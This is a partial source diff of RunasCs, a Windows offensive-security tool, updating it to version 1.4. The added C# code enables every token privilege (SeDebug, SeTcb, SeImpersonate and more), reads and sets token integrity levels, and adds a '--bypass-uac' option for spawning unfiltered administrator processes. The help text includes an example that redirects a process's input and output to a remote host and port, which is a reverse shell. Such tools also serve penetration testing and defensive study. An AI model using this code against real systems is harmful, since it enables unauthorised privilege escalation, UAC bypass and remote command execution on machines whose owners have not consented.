+        Disabled = 0,
+        SE_GROUP_MANDATORY = 1,
+        SE_GROUP_ENABLED_BY_DEFAULT = 0x2,
+        SE_GROUP_ENABLED = 0x4,
+        SE_GROUP_OWNER = 0x8,
+        SE_GROUP_USE_FOR_DENY_ONLY = 0x10,
+        SE_GROUP_INTEGRITY = 0x20,
+        SE_GROUP_INTEGRITY_ENABLED = 0x40,
+        SE_GROUP_RESOURCE = 0x20000000,
+        SE_GROUP_LOGON_ID = 0xC0000000
+    }
+
     private struct TOKEN_PRIVILEGES {
        public int PrivilegeCount;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst=64)]
        public LUID_AND_ATTRIBUTES [] Privileges;
     }
-    
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct TOKEN_PRIVILEGES_2
+    {
+        public UInt32 PrivilegeCount;
+        public LUID Luid;
+        public UInt32 Attributes;
+    }
+
     [StructLayout(LayoutKind.Sequential, Pack = 4)]
     private struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
@@ -1219,7 +1327,31 @@ public static class Token{
        public UInt32 LowPart;
        public Int32 HighPart;
     }
-    
+
+    private struct TOKEN_ELEVATION {
+        public UInt32 TokenIsElevated;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SID_IDENTIFIER_AUTHORITY
+    {
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6)]
+        public byte[] Value;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct SID_AND_ATTRIBUTES
+    {
+        public IntPtr pSID;
+        public TokenGroupAttributes Attributes;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    private struct TOKEN_MANDATORY_LABEL
+    {
+        public SID_AND_ATTRIBUTES Label;
+    }
+
     private static string convertAttributeToString(UInt32 attribute){
         if(attribute == 0)
             return "Disabled";
@@ -1231,7 +1363,24 @@ public static class Token{
             return "Enabled|Enabled Default";
         return "Error";
     }
-    
+
+    private static string EnablePrivilege(string privilege, IntPtr token)
+    {
+        string output = "";
+        LUID sebLuid = new LUID();
+        TOKEN_PRIVILEGES_2 tokenp = new TOKEN_PRIVILEGES_2();
+        tokenp.PrivilegeCount = 1;
+        LookupPrivilegeValue(null, privilege, ref sebLuid);
+        tokenp.Luid = sebLuid;
+        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
+        if (!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0))
+        {
+            throw new RunasCsException("AdjustTokenPrivileges on privilege " + privilege + " failed with error code: " + Marshal.GetLastWin32Error());
+        }
+        output += "\r\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
+        return output;
+    }
+
     public static List<string[]> getTokenPrivileges(IntPtr tHandle){
         List<string[]> privileges = new List<string[]>();
         uint TokenInfLength=0;
@@ -1264,16 +1413,110 @@ public static class Token{
         }
         return privileges;
     }
-}
 
+    public static bool IsLimitedUACToken(IntPtr hToken) {
+        bool filtered = false;
+        int TokenInfLength = 0;
+        bool Result;
+        // first call gets lenght of TokenInformation
+        Result = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, TokenInfLength, out TokenInfLength);
+        IntPtr tokenElevationPtr = Marshal.AllocHGlobal(TokenInfLength);
+        // then calls retrieving the reuired value
+        Result = GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenElevation, tokenElevationPtr, TokenInfLength, out TokenInfLength);
+        if (Result)
+        {
+            TOKEN_ELEVATION tokenElevation = (TOKEN_ELEVATION)Marshal.PtrToStructure(tokenElevationPtr, typeof(TOKEN_ELEVATION));
+            if (tokenElevation.TokenIsElevated == 0)
+                filtered = true;
+        }
+        Marshal.FreeHGlobal(tokenElevationPtr);
+        return filtered;
+    }
+
+    // thanks @winlogon0 --> https://github.com/AltF5/MediumToHighIL_Test/blob/main/TestCode2.cs
+    public static bool SetTokenIntegrityLevel(IntPtr hToken, IntegrityLevel integrity)
+    {
+        bool ret = false;
+        IntPtr pLabelAuthorityStruct;
+        IntPtr pSID;
+        IntPtr pLabel;
+        int labelSize;
+        TOKEN_MANDATORY_LABEL tokenLabel = new TOKEN_MANDATORY_LABEL();
+        SID_IDENTIFIER_AUTHORITY authoritySid = new SID_IDENTIFIER_AUTHORITY();
+        authoritySid.Value = MANDATORY_LABEL_AUTHORITY;
+        pLabelAuthorityStruct = Marshal.AllocHGlobal(Marshal.SizeOf(authoritySid));
+        Marshal.StructureToPtr(authoritySid, pLabelAuthorityStruct, false);
+        bool success = AllocateAndInitializeSid(pLabelAuthorityStruct, 1, (int)integrity, 0, 0, 0, 0, 0, 0, 0, out pSID);
+        tokenLabel.Label.pSID = pSID;
+        tokenLabel.Label.Attributes = TokenGroupAttributes.SE_GROUP_INTEGRITY;
+        labelSize = Marshal.SizeOf(tokenLabel);
+        pLabel = Marshal.AllocHGlobal(labelSize);
+        Marshal.StructureToPtr(tokenLabel, pLabel, false);
+        success = SetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pLabel, labelSize);
+        Marshal.FreeHGlobal(pLabel);
+        Marshal.FreeHGlobal(pSID);
+        Marshal.FreeHGlobal(pLabelAuthorityStruct);
+        if (!success)
+            throw new RunasCsException("[!] Failed to set the token's Integrity Level: " + integrity.ToString());
+        else
+            ret = true;
+        return ret;
+    }
+
+    public static IntegrityLevel GetTokenIntegrityLevel(IntPtr hToken)
+    {
+        IntegrityLevel illevel = IntegrityLevel.Unknown;
+        IntPtr pb = Marshal.AllocHGlobal(1000);
+        uint cb = 1000;
+        if (GetTokenInformation(hToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))
+        {
+            IntPtr pSid = Marshal.ReadIntPtr(pb);
+            int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));
+            if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
+            {
+                return IntegrityLevel.Low;
+            }
+            else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
+            {
+                // Medium Integrity
+                return IntegrityLevel.Medium;
+            }
+            else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
+            {
+                // High Integrity
+                return IntegrityLevel.High;
+            }
+            else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
+            {
+                // System Integrity
+                return IntegrityLevel.System;
+            }
+            return IntegrityLevel.Unknown;
+        }
+        Marshal.FreeHGlobal(pb);
+        return illevel;
+    }
+
+    public static string EnableAllPrivileges(IntPtr token)
+    {
+        string output = "";
+        string[] privileges = { "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", "SeDebugPrivilege", "SeDelegateSessionUserImpersonatePrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", "SeUndockPrivilege", "SeUnsolicitedInputPrivilege" };
+        foreach (string privilege in privileges)
+        {
+            output += EnablePrivilege(privilege, token);
+        }
+        return output;
+    }
+
+}
 
 public static class RunasCsMainClass
 {
     private static string help = @"
-RunasCs v1.3 - @splinter_code
+RunasCs v1.4 - @splinter_code
 
 Usage:
-    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile]
+    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--create-profile] [--bypass-uac]
 
 Description:
     RunasCs is an utility to run specific processes under a different user account
@@ -1295,12 +1538,12 @@ Optional arguments:
                             CreateProcess function to use. When not specified
                             RunasCs determines an appropriate CreateProcess
                             function automatically according to your privileges.
-                            0 - CreateProcessAsUserA
+                            0 - CreateProcessAsUserW
                             1 - CreateProcessWithTokenW
                             2 - CreateProcessWithLogonW
     -l, --logon-type logon_type
                             the logon type for the spawned process.
-                            Default: ""3""
+                            Default: ""8"" - NetworkCleartext
     -r, --remote host:port
                             redirect stdin, stdout and stderr to a remote host.
                             Using this option sets the process timeout to 0.
@@ -1321,6 +1564,10 @@ Optional arguments:
                             Compatible only with -f flags:
                                 1 - CreateProcessWithTokenW
                                 2 - CreateProcessWithLogonW
+    -b, --bypass-uac     
+                            if this flag is specified RunasCs will try a UAC
+                            bypass to spawn a process without token limitation
+                            (not filtered).
 
 Examples:
     Run a command as a specific local user
@@ -1333,6 +1580,8 @@ Examples:
         RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
     Run a command simulating the /netonly flag of runas.exe 
         RunasCs.exe user1 password1 whoami -d domain -l 9
+    Run a command as an Administrator bypassing UAC
+        RunasCs.exe adm1 password1 ""whoami /priv"" --bypass-uac
 ";
     
     // .NETv2 does not allow dict initialization with values. Therefore, we need a function :(
@@ -1355,7 +1604,7 @@ Examples:
     private static Dictionary<int,string> getCreateProcessFunctionDict()
     {
         Dictionary<int,string> createProcessFunctions = new Dictionary<int,string>();
-        createProcessFunctions.Add(0, "CreateProcessAsUser");
+        createProcessFunctions.Add(0, "CreateProcessAsUserW");
         createProcessFunctions.Add(1, "CreateProcessWithTokenW");
         createProcessFunctions.Add(2, "CreateProcessWithLogonW");
         return createProcessFunctions;
@@ -1438,23 +1687,20 @@ Examples:
         IntPtr currentTokenHandle = System.Security.Principal.WindowsIdentity.GetCurrent().Token;        
 
         List<string[]> privs = new List<string[]>();
-        privs = Token.getTokenPrivileges(currentTokenHandle);
+        privs = AccessToken.getTokenPrivileges(currentTokenHandle);
 
-        bool SeIncreaseQuotaPrivilegeAssigned = false;
         bool SeAssignPrimaryTokenPrivilegeAssigned = false;
         bool SeImpersonatePrivilegeAssigned = false;
 
         foreach (string[] s in privs)
         {
             string privilege = s[0];
-            if(privilege == "SeIncreaseQuotaPrivilege")
-                SeIncreaseQuotaPrivilegeAssigned = true;
             if(privilege == "SeAssignPrimaryTokenPrivilege")
                 SeAssignPrimaryTokenPrivilegeAssigned = true;
             if(privilege == "SeImpersonatePrivilege")
                 SeImpersonatePrivilegeAssigned = true;
         }
-        if (SeIncreaseQuotaPrivilegeAssigned && SeAssignPrimaryTokenPrivilegeAssigned)
+        if (SeAssignPrimaryTokenPrivilegeAssigned)
             createProcessFunction = 0;
         else 
             if (SeImpersonatePrivilegeAssigned)
@@ -1477,8 +1723,8 @@ Examples:
         username = password = cmd = domain = string.Empty;
         string[] remote = null;
         uint processTimeout = 120000;
-        int logonType = 3, createProcessFunction = DefaultCreateProcessFunction();
-        bool createUserProfile = false;
+        int logonType = 8, createProcessFunction = DefaultCreateProcessFunction();
+        bool createUserProfile = false, bypassUac = false;
         
         try {
             for(int ctr = 0; ctr < args.Length; ctr++) {
@@ -1514,7 +1760,12 @@ Examples:
                     case "--create-profile":
                         createUserProfile = true;
                         break;
-                    
+
+                    case "-b":
+                    case "--bypass-uac":
+                        bypassUac = true;
+                        break;
+
                     default:
                         positionals.Add(args[ctr]);
                         break;
@@ -1540,7 +1791,7 @@ Examples:
 
         RunasCs invoker = new RunasCs();
         try {
-            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, createUserProfile);
+            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, createUserProfile, bypassUac);
         } catch(RunasCsException e) {
             invoker.CleanupHandles();
             output = String.Format("{0}", e.Message);
@@ -1551,7 +1802,6 @@ Examples:
 }
 
 class MainClass{
-
     static void Main(string[] args)
     {
         Console.Out.Write(RunasCsMainClass.RunasCsMain(args));
